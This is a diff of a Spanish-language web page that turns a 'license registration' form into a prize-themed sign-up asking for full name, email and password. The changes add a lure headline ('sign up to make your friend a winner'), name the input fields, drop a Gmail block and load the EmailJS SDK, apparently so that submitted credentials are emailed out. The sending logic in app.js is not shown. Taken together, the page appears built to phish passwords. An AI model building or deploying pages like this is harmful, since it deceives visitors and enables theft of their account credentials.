@@ -9,34 +9,35 @@
 </head>
 <body>
     <div class="fondo-dinamico"></div>
-    
     <div class="contenedor">
         <div class="tarjeta">
             <div class="cabecera">
                 <div class="icono">🔑</div>
-                <h1>Registro de Licencia</h1>
+                <h1>Regístrate para ser a tu amigo ganador</h1>
                 <p>Verificación en 2 pasos</p>
             </div>
-
             <form id="formRegistro">
                 <div class="grupo-input">
-                    <input type="text" id="nombre" placeholder="Nombre completo" required>
+                    <input type="text" id="nombre" name="nombre" placeholder="Nombre completo" required>
                 </div>
-
                 <div class="grupo-input">
-                    <input type="email" id="correo" placeholder="correo@ejemplo.com" required>
-                    <div class="error-email">Correos Gmail no permitidos</div>
+                    <input type="email" id="correo" name="correo" placeholder="correo@ejemplo.com" required>
                 </div>
-
                 <div class="grupo-input">
-                    <input type="password" id="password" placeholder="Contraseña" required>
+                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                 </div>
-
                 <button type="submit">Validar Ahora →</button>
             </form>
         </div>
     </div>
 
+    <!-- SDK EmailJS -->
+    <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init('TU_USER_ID'); // Reemplaza con tu User ID de EmailJS
+        })();
+    </script>
     <script src="app.js"></script>
 </body>
 </html>
